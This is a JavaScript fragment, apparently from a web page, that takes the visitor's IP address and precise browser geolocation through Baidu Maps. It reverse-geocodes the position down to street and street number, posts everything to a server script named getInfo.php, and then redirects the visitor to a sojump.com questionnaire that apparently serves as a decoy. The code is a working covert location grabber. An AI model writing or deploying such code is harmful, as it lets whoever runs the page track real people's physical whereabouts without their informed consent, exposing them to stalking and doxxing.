  // 获取ip
   	cu_ip = ip.replace('|','')

	// var trackurl = "http://whois.pconline.com.cn/ipJson.jsp?callback=testJson&ip="+cu_ip
	// 获取位置gaode
    // var map = new AMap.Map('container',{
    //     zoom:30
    // })

    // var ll = map.getCenter()
   	// $.post("getInfo.php",{"lng":ll.getLng(),"lat":ll.getLat(),"realIp":cu_ip},function(data){

   	// })
  // 获取位置baidu



  var map = new BMap.Map("allmap");
  var geolocation = new BMap.Geolocation();
  
  var geoc = new BMap.Geocoder(); 
  geolocation.getCurrentPosition(function(r){
    var locatdirt
    if(this.getStatus() == BMAP_STATUS_SUCCESS){
          var pt = r.point
          geoc.getLocation(pt, function(rs){
          var addComp = rs.addressComponents;
          locatdirt = addComp.province + ", " + addComp.city + ", " + addComp.district + ", " + addComp.street + ", " + addComp.streetNumber
          $.post("getInfo.php",{"lng":r.point.lng.toFixed(10),"lat":r.point.lat.toFixed(10),"realIp":cu_ip,"locatStatus":"succ","locatdirt":locatdirt},function(data){
          location.href = 'http://www.sojump.com/jq/360100.aspx'     
        })

      });
    }
    else {
        $.post("getInfo.php",{"lng":"false","lat":"false","realIp":cu_ip,"locatStatus":"false"},function(data){
        // location.href = 'failed.php'
      })
    }       
  },{enableHighAccuracy: true})

